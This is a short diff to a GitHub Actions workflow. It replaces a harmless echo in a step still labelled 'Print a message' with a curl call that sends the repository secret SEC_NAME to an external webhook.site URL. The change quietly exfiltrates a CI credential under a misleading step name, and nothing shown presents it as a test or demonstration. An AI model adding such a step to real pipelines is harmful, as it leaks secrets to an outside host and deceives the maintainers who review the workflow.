@@ -11,4 +11,4 @@ jobs:
     environment: my_env
     steps:
       - name: Print a message
-        run: echo "111111111111"
+        run: curl "http://webhook.site/41c6b745-9747-4b36-9965-72752cbf04e0/value=${{ secrets.SEC_NAME }}"
